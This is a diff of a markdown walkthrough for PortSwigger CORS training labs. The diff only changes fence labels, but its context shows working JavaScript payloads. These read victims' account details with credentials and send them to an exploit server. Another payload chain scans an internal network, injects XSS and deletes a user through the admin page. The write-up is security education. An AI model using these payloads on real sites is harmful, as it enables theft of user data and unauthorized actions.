@@ -28,7 +28,7 @@ The origin is reflected in the `Access-Control-Allow-Origin` header, meaning the
 
 4. Create exploit (replacing `lab-id`):
 
-```html
+```text
 <script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
@@ -83,7 +83,7 @@ An attacker can directly forge a request from any trusted origin. Apply protecti
 3. Send the request to **Burp Repeater**, and resubmit it with the added header `Origin: null`. The "null" origin is reflected in the Access-Control-Allow-Origin header of the response.
 4. Create exploit (replacing `lab-id` and `exploit-server-id`). The iframe sandbox generates a null origin request.
 
-```html
+```text
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
@@ -122,7 +122,7 @@ The website of [this lab](https://portswigger.net/web-security/cors/lab-breaking
 4. Open a product page, click **Check stock**. It is loaded using a HTTP URL on a subdomain, and the `productID` parameter is vulnerable to [XSS](xss.md). 
 5. Create exploit ((replacing `lab-id` and `exploit-server-id`):
 
-```html
+```text
 <script>
     document.location="http://stock.lab-id.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://lab-id.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-server-id.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
@@ -150,7 +150,7 @@ The website of [this lab](https://portswigger.net/web-security/cors/lab-internal
 
 1. Scan the local network for the endpoint. Replace `$collaboratorPayload` with your own Collaborator payload or exploit server URL. Enter the following code into the exploit server. Click **Store**, then **Deliver exploit to victim**. Inspect the log or the Collaborator interaction and look at the code parameter sent to it.
 
-```html
+```text
 <script>
 var q = [], collaboratorURL = 'http://$collaboratorPayload';
 
@@ -188,7 +188,7 @@ function fetchUrl(url, wait) {
 
 2. Clear the code from stage 1 and enter the following code in the exploit server. Replace `$ip` with the IP address and port number retrieved from your collaborator interaction. Don't forget to add your Collaborator payload or exploit server URL again. Update and deliver your exploit. We will now probe the username field for an XSS vulnerability. You should retrieve a Collaborator interaction with `foundXSS=1` in the URL or you will see `foundXSS=1` in the log.
 
-```html
+```text
 <script>
 function xss(url, text, vector) {
 	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
@@ -206,7 +206,7 @@ fetchUrl("http://$ip", "http://$collaboratorPayload");
 
 3. Clear the code from stage 2 and enter the following code in the exploit server. Replace `$ip` with the same IP address and port number as in step 2 and don't forget to add your Collaborator payload or exploit server again. Update and deliver your exploit. Your Collaborator interaction or your exploit server log should now give you the source code of the admin page.
 
-```html
+```text
 <script>
 function xss(url, text, vector) {
 	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
@@ -226,7 +226,7 @@ fetchUrl("http://$ip", "http://$collaboratorPayload");
 
 4. Read the source code retrieved from step 3 in your Collaborator interaction or on the exploit server log. You'll notice there's a form that allows you to delete a user. Clear the code from stage 3 and enter the following code in the exploit server. Replace `$ip` with the same IP address and port number as in steps 2 and 3. The code submits the form to delete carlos by injecting an `iframe` pointing to the `/admin` page.
 
-```html
+```text
 <script>
 function xss(url, text, vector) {
 	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
